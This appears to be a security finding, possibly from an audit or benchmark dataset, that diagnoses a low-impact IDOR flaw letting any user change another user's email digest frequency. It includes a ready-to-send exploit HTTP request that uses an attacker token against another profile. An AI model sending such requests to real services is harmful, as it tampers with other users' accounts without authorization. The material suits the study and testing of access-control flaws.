diagnosis: The SetDigestFrequency handler allows changing email digest frequency for any user profile by supplying an arbitrary profileID in the path. While it does not expose sensitive data or allow privilege escalation, it allows low-impact tampering of other users' notification preferences.
exploit_request:
POST /settings/profiles/usr_8821/digest-frequency?freq=never HTTP/1.1
Host: community.devforum.org
Authorization: Bearer attacker_token_11
Content-Length: 0
